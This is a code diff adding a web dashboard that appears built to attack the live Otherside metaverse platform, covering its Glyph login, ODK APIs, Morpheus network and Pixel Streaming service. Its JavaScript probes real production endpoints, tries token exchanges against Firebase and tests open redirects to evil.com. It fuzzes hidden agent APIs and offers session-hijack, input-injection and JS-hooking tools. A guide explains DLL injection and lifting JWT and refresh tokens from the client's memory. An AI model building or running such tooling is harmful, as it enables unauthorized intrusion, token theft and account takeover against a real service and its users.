+                        <button class="btn btn-outline" onclick="testWalletVerify()">Verify Signature</button>
+                    </div>
+                </div>
+                <div id="nativeSub-world" style="display:none;">
+                    <div class="btn-row">
+                        <button class="btn btn-primary" onclick="listWorlds()">List Available Worlds</button>
+                        <button class="btn btn-outline" onclick="getWorldDetails()">World Details</button>
+                        <button class="btn btn-outline" onclick="tryWorldTravel()">Attempt Travel</button>
+                    </div>
+                </div>
+                <div id="nativeSub-session" style="display:none;">
+                    <div class="btn-row">
+                        <button class="btn btn-primary" onclick="probeSessionAPI()">Probe Session API</button>
+                        <button class="btn btn-outline" onclick="listActiveSessions()">List Active Sessions</button>
+                        <button class="btn btn-outline" onclick="trySessionHijack()">Session Hijack Test</button>
+                    </div>
+                </div>
+                <div class="console" id="nativeAPILog" style="margin-top:12px;">
+                    <div class="log-info">[NATIVE-API] Select a sub-tab and probe the ODK Dashboard APIs.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Client Memory/Process Analysis Guide <span class="badge badge-orange">Advanced</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    For local analysis of the running client process, use these tools and techniques:
+                </p>
+                <div class="flow-step">
+                    <div class="step-num num-blue">1</div>
+                    <div>
+                        <div class="step-title">Process Discovery</div>
+                        <div class="step-desc">Find Otherside.exe process and its memory layout. Use Process Monitor to track file/registry/network access.</div>
+                    </div>
+                </div>
+                <div class="flow-step">
+                    <div class="step-num num-green">2</div>
+                    <div>
+                        <div class="step-title">Config Extraction</div>
+                        <div class="step-desc">Extract .ini and .json config files from the game directory. Look for API keys, endpoints, and auth tokens in config files and logs.</div>
+                    </div>
+                </div>
+                <div class="flow-step">
+                    <div class="step-num num-orange">3</div>
+                    <div>
+                        <div class="step-title">Network Capture</div>
+                        <div class="step-desc">Use Wireshark/Fiddler to capture WebSocket traffic. Apply TLS interception for HTTPS. Identify Morpheus protocol structure.</div>
+                    </div>
+                </div>
+                <div class="flow-step">
+                    <div class="step-num num-purple">4</div>
+                    <div>
+                        <div class="step-title">DLL Injection / Hooking</div>
+                        <div class="step-desc">Inject into the Unreal Engine process to hook networking functions. Intercept calls to FWebSocket::Send/Recv for protocol analysis.</div>
+                    </div>
+                </div>
+                <div class="flow-step">
+                    <div class="step-num num-red">5</div>
+                    <div>
+                        <div class="step-title">Token Extraction</div>
+                        <div class="step-desc">Search process memory for JWT tokens, session cookies, and WebSocket URLs. Look for Firebase ID tokens and refresh tokens in memory.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- ================================================================ -->
+        <!-- PHASE 5: PIXEL STREAMING -->
+        <!-- ================================================================ -->
+        <div class="phase-content" id="phase-streaming">
+            <div class="card">
+                <h3>📺 Phase 5: Pixel Streaming Security <span class="badge badge-green">WebRTC</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Otherside supports browser-based play via Google Cloud Immersive Stream for XR (Pixel Streaming). This uses WebRTC for video delivery and a signaling server for input relay. The attack surface includes WebRTC, signaling, and the input channel.
+                </p>
+                <div class="alert-box alert-info">
+                    <strong>How Pixel Streaming Works:</strong> Unreal Engine runs on a cloud GPU → Video is encoded and streamed via WebRTC → User input (mouse, keyboard, controller) is sent back via a WebSocket data channel → The server processes input and updates the game state. Requires Google Chrome and 25+ Mbps.
+                </div>
+            </div>
+
+            <div class="grid-2">
+                <div class="card">
+                    <h3>Pixel Streaming Discovery <span class="badge badge-blue">Recon</span></h3>
+                    <div class="btn-row">
+                        <button class="btn btn-primary" onclick="discoverStreamingEndpoints()">Discover Streaming Infra</button>
+                        <button class="btn btn-outline" onclick="probeSignalingServer()">Probe Signaling Server</button>
+                        <button class="btn btn-outline" onclick="probeSTUNTURN()">Probe STUN/TURN Servers</button>
+                    </div>
+                    <div class="progress-bar"><div class="progress-fill" id="streamingProgress"></div></div>
+                    <div class="console" id="streamingLog">
+                        <div class="log-info">[STREAMING] Ready to discover and test Pixel Streaming infrastructure.</div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>Pixel Streaming Architecture <span class="badge badge-green">WebRTC</span></h3>
+                    <div class="arch-diagram">
+┌─────────────┐    WebRTC     ┌──────────────┐
+│ Chrome       │◄────────────▶│ Immersive    │
+│ Browser      │  Video Stream│ Stream for XR│
+│ (25+ Mbps)   │              │ (Cloud GPU)  │
+└──────┬──────┘               └──────┬───────┘
+       │                             │
+       │ Input (WebSocket)           │ Unreal Engine 5
+       │ Mouse/Keyboard/Controller   │ (Pixel Streaming Plugin)
+       ▼                             ▼
+┌──────────────┐             ┌────────────────┐
+│  Signaling   │◄───────────▶│  Game Server   │
+│  Server      │   SDP/ICE   │  (Morpheus)    │
+└──────────────┘             └────────────────┘</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>WebRTC/Signaling Interceptor <span class="badge badge-red">MITM</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Intercept and analyze the WebRTC signaling (SDP offers/answers, ICE candidates) and the input data channel between the browser and the streaming server.
+                </p>
+                <div class="input-group">
+                    <label>Pixel Streaming Signaling URL:</label>
+                    <input type="text" id="streamingSignalingUrl" placeholder="wss://signaling.otherside.xyz/cirrus">
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="connectStreamingSignaling()">Connect to Signaling</button>
+                    <button class="btn btn-outline" onclick="interceptInputChannel()">Intercept Input Channel</button>
+                    <button class="btn btn-danger" onclick="injectStreamingInput()">Inject Input Commands</button>
+                    <button class="btn btn-outline" onclick="captureSDP()">Capture SDP/ICE</button>
+                </div>
+                <div class="console" id="streamingWSLog" style="max-height:400px;">
+                    <div class="log-info">[STREAMING-WS] Ready to connect to Pixel Streaming signaling server.</div>
+                </div>
+            </div>
+
+            <div class="card">
+                <h3>Pixel Streaming JS Injection <span class="badge badge-purple">XSS</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    The Pixel Streaming client loads JavaScript that handles input, UI overlays, and communication. This JS runs in the browser context and can be modified or injected.
+                </p>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="analyzeStreamingJS()">Analyze Streaming JS</button>
+                    <button class="btn btn-outline" onclick="findPixelStreamingEndpoints()">Find PS Endpoints</button>
+                    <button class="btn btn-cyan" onclick="buildPixelStreamingClient()">Build Custom Client</button>
+                </div>
+                <div class="input-group">
+                    <label>Custom JS Payload (inject into Pixel Streaming page):</label>
+                    <textarea id="streamingJSPayload" placeholder="// Example: Hook the input handler
+// Original: emitMouseClick(x, y)
+// Hooked: capture and log all inputs
+const origClick = window.emitMouseClick;
+window.emitMouseClick = function(x, y) {
+    console.log('[INTERCEPTED] Click at:', x, y);
+    return origClick.call(this, x, y);
+};"></textarea>
+                </div>
+                <div class="console" id="streamingJSLog">
+                    <div class="log-info">[STREAMING-JS] Ready to analyze and inject into Pixel Streaming JS.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Proxy helper (uses /api/proxy for CORS-bypassed requests) -->
+    <script>
+        // ===================================================================
+        // GLOBAL STATE
+        // ===================================================================
+        let stats = { endpoints: 0, discovered: 0, vulns: 0, tokens: 0, packets: 0, sessions: 0 };
+        let morpheusWS = null;
+        let streamingWS = null;
+        let packetCount = 0;
+
+        function updateStats() {
+            document.getElementById('statEndpoints').textContent = stats.endpoints;
+            document.getElementById('statDiscovered').textContent = stats.discovered;
+            document.getElementById('statVulns').textContent = stats.vulns;
+            document.getElementById('statTokens').textContent = stats.tokens;
+            document.getElementById('statPackets').textContent = stats.packets;
+            document.getElementById('statSessions').textContent = stats.sessions;
+        }
+
+        // ===================================================================
+        // PHASE SWITCHING
+        // ===================================================================
+        function switchPhase(phase) {
+            document.querySelectorAll('.phase-content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.phase-btn').forEach(el => el.classList.remove('active'));
+            document.getElementById('phase-' + phase).classList.add('active');
+            event.currentTarget.classList.add('active');
+        }
+
+        function switchNativeSub(sub) {
+            document.querySelectorAll('[id^="nativeSub-"]').forEach(el => el.style.display = 'none');
+            document.getElementById('nativeSub-' + sub).style.display = 'block';
+            document.querySelectorAll('.tab-sub button').forEach(el => el.classList.remove('active'));
+            event.currentTarget.classList.add('active');
+        }
+
+        // ===================================================================
+        // LOGGING HELPERS
+        // ===================================================================
+        function log(consoleId, message, type = 'info') {
+            const el = document.getElementById(consoleId);
+            if (!el) return;
+            const div = document.createElement('div');
+            div.className = 'log-' + type;
+            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
+            el.appendChild(div);
+            el.scrollTop = el.scrollHeight;
+        }
+
+        function setProgress(barId, pct) {
+            const el = document.getElementById(barId);
+            if (el) el.style.width = pct + '%';
+        }
+
+        // ===================================================================
+        // PROXY REQUEST HELPER
+        // ===================================================================
+        async function proxyRequest(endpoint, method, token, body = null) {
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint, method, token, body })
+                });
+                return await resp.json();
+            } catch (e) {
+                return { error: e.message };
+            }
+        }
+
+        // Direct fetch with CORS
+        async function directFetch(url, options = {}) {
+            try {
+                const resp = await fetch(url, options);
+                const contentType = resp.headers.get('content-type') || '';
+                let data;
+                if (contentType.includes('json')) data = await resp.json();
+                else data = await resp.text();
+                return { status: resp.status, ok: resp.ok, data };
+            } catch (e) {
+                return { error: e.message, ok: false };
+            }
+        }
+
+        // ===================================================================
+        // PHASE 1: GLYPH AUTH
+        // ===================================================================
+
+        async function discoverGlyphOIDC() {
+            const cId = 'glyphLog';
+            log(cId, 'Starting Glyph OIDC discovery...', 'info');
+            setProgress('glyphProgress', 10);
+
+            // Standard OIDC discovery endpoints
+            const oidcPaths = [
+                'https://useglyph.io/.well-known/openid-configuration',
+                'https://useglyph.io/.well-known/oauth-authorization-server',
+                'https://auth.useglyph.io/.well-known/openid-configuration',
+                'https://auth.otherside.xyz/.well-known/openid-configuration',
+                'https://www.otherside.xyz/.well-known/openid-configuration',
+                'https://odk.otherside.xyz/.well-known/openid-configuration',
+                'https://api.useglyph.io/.well-known/openid-configuration',
+            ];
+
+            for (let i = 0; i < oidcPaths.length; i++) {
+                const url = oidcPaths[i];
+                log(cId, `Probing: ${url}`, 'dim');
+                setProgress('glyphProgress', 10 + (i / oidcPaths.length) * 70);
+
+                const result = await directFetch(url);
+                if (result.ok) {
+                    log(cId, `FOUND: ${url}`, 'success');
+                    log(cId, `Response: ${JSON.stringify(result.data).substring(0, 500)}`, 'data');
+                    stats.discovered++;
+                } else {
+                    log(cId, `  → ${result.status || 'ERR'}: ${result.error || 'No OIDC config'}`, 'dim');
+                }
+                stats.endpoints++;
+            }
+
+            // Try to discover Glyph auth endpoints via HTML scraping
+            log(cId, 'Scanning Otherside login page for Glyph auth URLs...', 'info');
+            const loginPage = await directFetch('https://www.otherside.xyz');
+            if (loginPage.ok && typeof loginPage.data === 'string') {
+                const authUrls = loginPage.data.match(/https?:\/\/[^\s"']*auth[^\s"']*/gi) || [];
+                const glyphUrls = loginPage.data.match(/https?:\/\/[^\s"']*glyph[^\s"']*/gi) || [];
+                const oauthUrls = loginPage.data.match(/https?:\/\/[^\s"']*oauth[^\s"']*/gi) || [];
+                const allUrls = [...new Set([...authUrls, ...glyphUrls, ...oauthUrls])];
+                allUrls.forEach(url => log(cId, `Discovered auth URL: ${url}`, 'success'));
+                if (allUrls.length > 0) stats.discovered += allUrls.length;
+            }
+
+            // Probe known Glyph API patterns
+            const glyphAPIPaths = [
+                'https://useglyph.io/api/auth/session',
+                'https://useglyph.io/api/auth/csrf',
+                'https://useglyph.io/api/auth/providers',
+                'https://useglyph.io/api/auth/signin',
+                'https://useglyph.io/api/auth/callback',
+                'https://useglyph.io/api/v1/me',
+                'https://useglyph.io/api/v1/wallet',
+                'https://useglyph.io/api/v1/token',
+            ];
+
+            for (const url of glyphAPIPaths) {
+                const result = await directFetch(url);
+                if (result.status !== 404) {
+                    log(cId, `[${result.status}] ${url} → ${typeof result.data === 'string' ? result.data.substring(0, 200) : JSON.stringify(result.data).substring(0, 200)}`, result.ok ? 'success' : 'warning');
+                    stats.endpoints++;
+                }
+            }
+
+            setProgress('glyphProgress', 100);
+            updateStats();
+            log(cId, 'Glyph OIDC discovery complete.', 'success');
+        }
+
+        async function probeGlyphAuth() {
+            const cId = 'glyphLog';
+            log(cId, 'Probing Glyph authentication endpoints...', 'info');
+
+            const endpoints = [
+                { name: 'Glyph Login', url: 'https://useglyph.io/login' },
+                { name: 'Glyph OAuth Authorize', url: 'https://useglyph.io/oauth/authorize' },
+                { name: 'Glyph OAuth Token', url: 'https://useglyph.io/oauth/token' },
+                { name: 'Glyph SIWE', url: 'https://useglyph.io/api/siwe' },
+                { name: 'Otherside Auth', url: 'https://www.otherside.xyz/api/auth' },
+                { name: 'ODK Auth', url: 'https://odk.otherside.xyz/api/v0/auth' },
+                { name: 'ODK Me', url: 'https://odk.otherside.xyz/api/v0/me' },
+                { name: 'ODK Session', url: 'https://odk.otherside.xyz/api/v0/session' },
+            ];
+
+            for (const ep of endpoints) {
+                const result = await directFetch(ep.url);
+                log(cId, `[${result.status || 'ERR'}] ${ep.name}: ${ep.url}`, result.ok ? 'success' : 'warning');
+                if (result.ok && typeof result.data !== 'string') {
+                    log(cId, `  Data: ${JSON.stringify(result.data).substring(0, 300)}`, 'data');
+                }
+                stats.endpoints++;
+            }
+
+            updateStats();
+        }
+
+        async function fetchGlyphJWKS() {
+            const cId = 'glyphLog';
+            log(cId, 'Fetching JWKS public keys...', 'info');
+
+            const jwksUrls = [
+                'https://useglyph.io/.well-known/jwks.json',
+                'https://auth.useglyph.io/.well-known/jwks.json',
+                'https://www.googleapis.com/service_accounts/v1/jwk/scarcely-calm-lark@appspot.gserviceaccount.com',
+                'https://www.googleapis.com/robot/v1/metadata/jwk/scarcely-calm-lark@appspot.gserviceaccount.com',
+            ];
+
+            for (const url of jwksUrls) {
+                log(cId, `Probing: ${url}`, 'dim');
+                const result = await directFetch(url);
+                if (result.ok) {
+                    log(cId, `FOUND JWKS: ${url}`, 'success');
+                    if (typeof result.data === 'object' && result.data.keys) {
+                        result.data.keys.forEach((key, i) => {
+                            log(cId, `  Key ${i}: kid=${key.kid}, alg=${key.alg}, kty=${key.kty}`, 'data');
+                        });
+                    }
+                    stats.discovered++;
+                }
+                stats.endpoints++;
+            }
+
+            updateStats();
+        }
+
+        async function attemptGlyphTokenExchange() {
+            const cId = 'glyphForgeLog';
+            log(cId, 'Attempting Glyph → Firebase token exchange...', 'info');
+            setProgress('glyphForgeProgress', 20);
+
+            const clientId = document.getElementById('glyphClientId').value;
+            const redirectUri = document.getElementById('glyphRedirectUri').value;
+            const firebaseKey = document.getElementById('glyphFirebaseKey').value;
+
+            // Step 1: Probe the exchange endpoint
+            log(cId, 'Step 1: Probing token exchange endpoint...', 'info');
+            const exchangeEndpoints = [
+                'https://odk.otherside.xyz/api/v0/auth/token',
+                'https://odk.otherside.xyz/api/v0/auth/exchange',
+                'https://odk.otherside.xyz/api/v0/auth/custom-token',
+                'https://www.otherside.xyz/api/auth/token',
+                'https://useglyph.io/api/token/exchange',
+                'https://useglyph.io/api/v1/firebase-token',
+            ];
+
+            setProgress('glyphForgeProgress', 50);
+
+            for (const url of exchangeEndpoints) {
+                const result = await directFetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ grant_type: 'urn:ietf:params:oauth:grant-type:token-exchange', client_id: clientId })
+                });
+                const status = result.status || 'ERR';
+                if (status !== 404) {
+                    log(cId, `[${status}] ${url} → ${typeof result.data === 'string' ? result.data.substring(0, 200) : JSON.stringify(result.data).substring(0, 200)}`, status === 200 ? 'success' : 'warning');
+                }
+                stats.endpoints++;
+            }
+
+            // Step 2: Try Firebase signInWithCustomToken with the discovered key
+            log(cId, 'Step 2: Testing Firebase signInWithCustomToken endpoint...', 'info');
+            const customTokenUrl = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${firebaseKey}`;
+            const result = await directFetch(customTokenUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token: 'test-token', returnSecureToken: true })
+            });
+
+            if (result.ok) {
+                log(cId, 'CRITICAL: signInWithCustomToken accepted a token!', 'critical');
+                stats.vulns++;
+            } else {
+                log(cId, `signInWithCustomToken response: ${JSON.stringify(result.data).substring(0, 300)}`, result.data?.error?.message === 'INVALID_CUSTOM_TOKEN' ? 'warning' : 'info');
+            }
+
+            setProgress('glyphForgeProgress', 100);
+            updateStats();
+        }
+
+        async function buildSIWEMessage() {
+            const cId = 'glyphForgeLog';
+            const wallet = document.getElementById('glyphWalletAddr').value || '0x0000000000000000000000000000000000000000';
+            const nonce = Math.floor(Math.random() * 1000000);
+            const issuedAt = new Date().toISOString();
+
+            const siweMessage = `www.otherside.xyz wants you to sign in with your Ethereum account:\n${wallet}\n\nSign in to Otherside\n\nURI: https://www.otherside.xyz\nVersion: 1\nChain ID: 1\nNonce: ${nonce}\nIssued At: ${issuedAt}`;
+
+            log(cId, 'Generated SIWE (Sign-In with Ethereum) Message:', 'info');
+            log(cId, siweMessage, 'data');
+            log(cId, '', 'info');
+            log(cId, 'This message format is used by Glyph to authenticate wallet connections.', 'info');
+            log(cId, 'If the signature is intercepted, it can be replayed to authenticate as the wallet owner.', 'warning');
+            stats.tokens++;
+            updateStats();
+        }
+
+        async function testGlyphCallback() {
+            const cId = 'glyphForgeLog';
+            log(cId, 'Testing Glyph OAuth callback URLs for open redirect vulnerabilities...', 'info');
+
+            const callbackUrls = [
+                'https://www.otherside.xyz/callback?code=test&state=test',
+                'https://www.otherside.xyz/api/auth/callback/glyph?code=test',
+                'https://odk.otherside.xyz/callback?code=test',
+                'https://www.otherside.xyz/api/auth/callback/glyph?redirect_uri=https://evil.com',
+            ];
+
+            for (const url of callbackUrls) {
+                const result = await directFetch(url);
+                log(cId, `[${result.status || 'ERR'}] ${url}`, result.status === 302 || result.status === 301 ? 'warning' : 'info');
+                stats.endpoints++;
+            }
+
+            updateStats();
+        }
+
+        async function glyphTokenReplay() {
+            const cId = 'glyphForgeLog';
+            log(cId, 'Testing token replay scenarios...', 'warning');
+            log(cId, 'Token replay requires a valid token. Use the tools above to obtain one first.', 'info');
+            log(cId, 'Replay vectors:', 'info');
+            log(cId, '  1. Replay Firebase ID Token on ODK Dashboard API', 'info');
+            log(cId, '  2. Replay Glyph OIDC Token on different endpoints', 'info');
+            log(cId, '  3. Replay wallet signature on different sessions', 'info');
+            log(cId, '  4. Use refresh token to maintain persistent access', 'info');
+        }
+
+        async function decodeGlyphToken() {
+            const cId = 'glyphBridgeLog';
+            const token = document.getElementById('glyphOidcToken').value;
+            if (!token) { log(cId, 'Please paste a token first.', 'error'); return; }
+
+            try {
+                const parts = token.split('.');
+                if (parts.length !== 3) throw new Error('Not a valid JWT');
+
+                const header = JSON.parse(atob(parts[0]));
+                const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
+
+                log(cId, 'JWT Header:', 'info');
+                log(cId, JSON.stringify(header, null, 2), 'data');
+                log(cId, 'JWT Payload:', 'info');
+                log(cId, JSON.stringify(payload, null, 2), 'data');
+
+                // Check for security issues
+                if (payload.iss) log(cId, `Issuer: ${payload.iss}`, 'info');
+                if (payload.aud) log(cId, `Audience: ${payload.aud}`, 'info');
+                if (payload.exp) {
+                    const expDate = new Date(payload.exp * 1000);
+                    const isExpired = expDate < new Date();
+                    log(cId, `Expiry: ${expDate.toISOString()} ${isExpired ? '(EXPIRED)' : '(VALID)'}`, isExpired ? 'error' : 'success');
+                }
+                if (payload.iat) log(cId, `Issued: ${new Date(payload.iat * 1000).toISOString()}`, 'info');
+                if (payload.sub) log(cId, `Subject: ${payload.sub}`, 'data');
+                if (payload.email) log(cId, `Email: ${payload.email}`, 'data');
+                if (payload.wallet) log(cId, `Wallet: ${payload.wallet}`, 'data');
+
+                // Check algorithm
+                if (header.alg === 'none' || header.alg === 'HS256') {
+                    log(cId, `VULN: Weak algorithm: ${header.alg}`, 'critical');
+                    stats.vulns++;
+                }
+
+                stats.tokens++;
+                updateStats();
+            } catch (e) {
+                log(cId, `Token decode error: ${e.message}`, 'error');
+            }
+        }
+
+        async function exchangeGlyphForFirebase() {
+            const cId = 'glyphBridgeLog';
+            const token = document.getElementById('glyphOidcToken').value;
+            const firebaseKey = document.getElementById('glyphFirebaseKey').value;
+
+            if (!token) { log(cId, 'Please paste a Glyph OIDC token first.', 'error'); return; }
+
+            log(cId, 'Attempting to exchange Glyph token for Firebase Custom Token...', 'info');
+
+            // Try ODK exchange endpoint
+            const result = await proxyRequest('auth/exchange', 'POST', token, { oidc_token: token });
+            log(cId, `ODK Exchange: ${JSON.stringify(result).substring(0, 500)}`, result.data ? 'success' : 'warning');
+
+            // Try direct Firebase exchange
+            const fbResult = await directFetch(`https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${firebaseKey}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ token: token, returnSecureToken: true })
+            });
+            log(cId, `Firebase Custom Token Auth: ${JSON.stringify(fbResult.data).substring(0, 300)}`, fbResult.ok ? 'success' : 'warning');
+
+            stats.endpoints += 2;
+            updateStats();
+        }
+
+        async function testGlyphScopes() {
+            const cId = 'glyphBridgeLog';
+            log(cId, 'Testing available OAuth scopes for Glyph...', 'info');
+
+            const scopes = [
+                'openid', 'profile', 'email', 'wallet', 'offline_access',
+                'otherside:read', 'otherside:write', 'otherside:admin',
+                'odk:read', 'odk:write', 'odk:admin',
+                'world:read', 'world:write', 'world:build',
+            ];
+
+            for (const scope of scopes) {
+                const url = `https://useglyph.io/oauth/authorize?scope=${scope}&response_type=code&client_id=test&redirect_uri=https://www.otherside.xyz/callback`;
+                const result = await directFetch(url);
+                log(cId, `Scope "${scope}": [${result.status || 'ERR'}]`, result.status === 200 || result.status === 302 ? 'success' : 'dim');
+                stats.endpoints++;
+            }
+
+            updateStats();
+        }
+
+        // ===================================================================
+        // PHASE 2: AGENTIC API
+        // ===================================================================
+
+        async function mapAgenticAPI() {
+            const cId = 'agenticLog';
+            log(cId, 'Mapping Otherside Agentic API endpoints...', 'info');
+            setProgress('agenticProgress', 10);
+
+            const basePath = 'agent/';
+            const paths = [
+                'status', 'worlds', 'players', 'npcs', 'quests', 'inventory',
+                'chat', 'teleport', 'build', 'permissions', 'session', 'config',
+                'health', 'version', 'schema', 'docs', 'openapi', 'swagger',
+                'authenticate', 'execute', 'observe', 'interact', 'navigate',
+                'collect', 'craft', 'trade', 'combat', 'social',
+            ];
+
+            const token = document.getElementById('agenticToken').value || 'test';
+            const resultsDiv = document.getElementById('agenticEndpoints');
+            let html = '';
+
+            for (let i = 0; i < paths.length; i++) {
+                const endpoint = basePath + paths[i];
+                const result = await proxyRequest(endpoint, 'GET', token);
+                const status = result.status || 0;
+                const isOK = status === 200;
+                const isAuth = status === 401 || status === 403;
+                const isFound = status !== 404 && status !== 0;
+
+                if (isFound) {
+                    log(cId, `[${status}] /api/v0/${endpoint} ${isOK ? '→ ACCESSIBLE' : isAuth ? '→ NEEDS AUTH' : ''}`, isOK ? 'success' : 'warning');
+                    stats.discovered++;
+                    const cls = isOK ? 'ep-ok' : isAuth ? 'ep-warn' : 'ep-fail';
+                    html += `<div class="ep-item ${cls}">
+                        <span class="ep-method">GET</span> /api/v0/${endpoint}<br>
+                        Status: ${status} ${isOK ? '✓' : isAuth ? '🔒' : ''}<br>
+                        ${isOK && result.data ? `<div style="color:#c4b5fd;margin-top:4px;word-break:break-all;">${JSON.stringify(result.data).substring(0, 150)}</div>` : ''}
+                    </div>`;
+                }
+
+                setProgress('agenticProgress', 10 + (i / paths.length) * 80);
+                stats.endpoints++;
+            }
+
+            if (html) resultsDiv.innerHTML = html;
+            setProgress('agenticProgress', 100);
+            updateStats();
+            log(cId, 'Agentic API mapping complete.', 'success');
+        }
+
+        async function probeAgentEndpoints() {
+            const cId = 'agenticLog';
+            log(cId, 'Probing known Agentic API patterns...', 'info');
+
+            const patterns = [
+                'agent/v1/status', 'agent/v1/worlds', 'agent/v1/execute',
+                'agentic/status', 'agentic/execute', 'agentic/observe',
+                'odk/agent/status', 'odk/agent/execute',
+                'bots/status', 'bots/execute', 'bots/interact',
+                'npc/agent/status', 'npc/agent/interact',
+                'koda/agent/status', 'koda/agent/chat', 'koda/agent/execute',
+            ];
+
+            const token = document.getElementById('agenticToken').value || 'test';
+            for (const path of patterns) {
+                const result = await proxyRequest(path, 'GET', token);
+                if (result.status && result.status !== 404) {
+                    log(cId, `[${result.status}] /api/v0/${path}`, result.status === 200 ? 'success' : 'warning');
+                    stats.discovered++;
+                }
+                stats.endpoints++;
+            }
+
+            updateStats();
+        }
+
+        async function fuzzAgenticAPI() {
+            const cId = 'agenticLog';
+            log(cId, 'Fuzzing Agentic API paths...', 'info');
+            const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+            const token = document.getElementById('agenticToken').value || 'test';
+            let found = 0;
+
+            for (let i = 0; i < 50; i++) {
+                let path = '';
+                for (let j = 0; j < Math.floor(Math.random() * 8) + 3; j++) {
+                    path += chars[Math.floor(Math.random() * chars.length)];
+                }
+                const result = await proxyRequest('agent/' + path, 'GET', token);
+                if (result.status && result.status !== 404 && result.status !== 0) {
+                    log(cId, `[${result.status}] /api/v0/agent/${path}`, 'warning');
+                    found++;
+                    stats.discovered++;
+                }
+                stats.endpoints++;
+            }
+
+            log(cId, `Fuzzing complete. Found ${found} non-404 responses.`, found > 0 ? 'success' : 'info');
+            updateStats();
+        }
+
+        async function testAgentAuth() {
+            const cId = 'agenticLog';
+            const token = document.getElementById('agenticToken').value;
+            if (!token) { log(cId, 'Please enter a token first.', 'error'); return; }
+
+            log(cId, 'Testing Agentic API authentication methods...', 'info');
+
+            // Test different auth methods
+            const authMethods = [
+                { name: 'Bearer Token', headers: { 'Authorization': `Bearer ${token}` } },
+                { name: 'X-API-Key', headers: { 'X-API-Key': token } },
+                { name: 'X-Auth-Token', headers: { 'X-Auth-Token': token } },
+            ];
+
+            for (const method of authMethods) {
+                const result = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ endpoint: 'agent/status', method: 'GET', token, extraHeaders: method.headers })
+                });
+                const data = await result.json();
+                log(cId, `${method.name}: [${data.status}]`, data.status === 200 ? 'success' : 'warning');
+                stats.endpoints++;
+            }
+
+            updateStats();
+        }
+
+        async function sendAgenticRequest() {
+            const cId = 'agenticClientLog';
+            const token = document.getElementById('agenticToken').value;
+            const endpoint = document.getElementById('agenticEndpoint').value;
+            const method = document.getElementById('agenticMethod').value;
+            const body = document.getElementById('agenticBody').value;
+
+            if (!token) { log(cId, 'Please enter an auth token.', 'error'); return; }
+
+            log(cId, `Sending ${method} /api/v0/${endpoint}...`, 'info');
+
+            let parsedBody = null;
+            if (body && method !== 'GET') {
+                try { parsedBody = JSON.parse(body); } catch { parsedBody = { raw: body }; }
+            }
+
+            const result = await proxyRequest(endpoint, method, token, parsedBody);
+            log(cId, `Response [${result.status || 'ERR'}]:`, result.status === 200 ? 'success' : 'warning');
+            log(cId, JSON.stringify(result.data || result.error || result, null, 2).substring(0, 1000), 'data');
+
+            stats.endpoints++;
+            updateStats();
+        }
+
+        async function startAgenticSession() {
+            const cId = 'agenticClientLog';
+            const token = document.getElementById('agenticToken').value;
+            if (!token) { log(cId, 'Please enter an auth token.', 'error'); return; }
+
+            log(cId, 'Starting Agentic API session...', 'info');
+
+            const result = await proxyRequest('agent/session', 'POST', token, { action: 'start', client: 'm2-odk-dashboard' });
+            log(cId, `Session response [${result.status || 'ERR'}]: ${JSON.stringify(result.data || result.error || result).substring(0, 500)}`, result.status === 200 ? 'success' : 'warning');
+
+            if (result.status === 200) stats.sessions++;
+            stats.endpoints++;
+            updateStats();
+        }
+
+        async function batchAgenticScan() {
+            const cId = 'agenticClientLog';
+            const token = document.getElementById('agenticToken').value;
+            if (!token) { log(cId, 'Please enter an auth token.', 'error'); return; }
+
+            log(cId, 'Running batch scan of all Agentic API endpoints...', 'info');
+
+            const endpoints = document.getElementById('agenticEndpoint').options;
+            for (let i = 0; i < endpoints.length; i++) {
+                const ep = endpoints[i].value;
+                const result = await proxyRequest(ep, 'GET', token);
+                const status = result.status || 0;
+                log(cId, `[${status}] ${ep}`, status === 200 ? 'success' : status === 401 || status === 403 ? 'warning' : 'dim');
+                stats.endpoints++;
+            }
+
+            updateStats();
+        }
+
+        // ===================================================================
+        // PHASE 3: MORPHEUS NETWORK
+        // ===================================================================
+
+        async function discoverMorpheusEndpoints() {
+            const cId = 'morpheusLog';
+            log(cId, 'Discovering Morpheus/MSquared network endpoints...', 'info');
+            setProgress('morpheusProgress', 10);
+
+            // MSquared infrastructure endpoints
+            const endpoints = [
+                { name: 'MSquared Main', url: 'https://msquared.io' },
+                { name: 'MSquared API', url: 'https://api.msquared.io' },
+                { name: 'MSquared Gateway', url: 'https://gateway.msquared.io' },
+                { name: 'MSquared Auth', url: 'https://auth.msquared.io' },
+                { name: 'MSquared Protocol', url: 'https://protocol.msquared.io' },
+                { name: 'Morpheus API', url: 'https://morpheus.msquared.io' },
+                { name: 'Morpheus WS', url: 'wss://morpheus.msquared.io' },
+                { name: 'SpatialOS API', url: 'https://api.spatial.io' },
+                { name: 'ODK Worlds', url: 'https://odk.otherside.xyz/api/v0/worlds' },
+                { name: 'ODK Streaming', url: 'https://odk.otherside.xyz/api/v0/streaming' },
+                { name: 'ODK Origin', url: 'https://odk.otherside.xyz/api/v0/origin' },
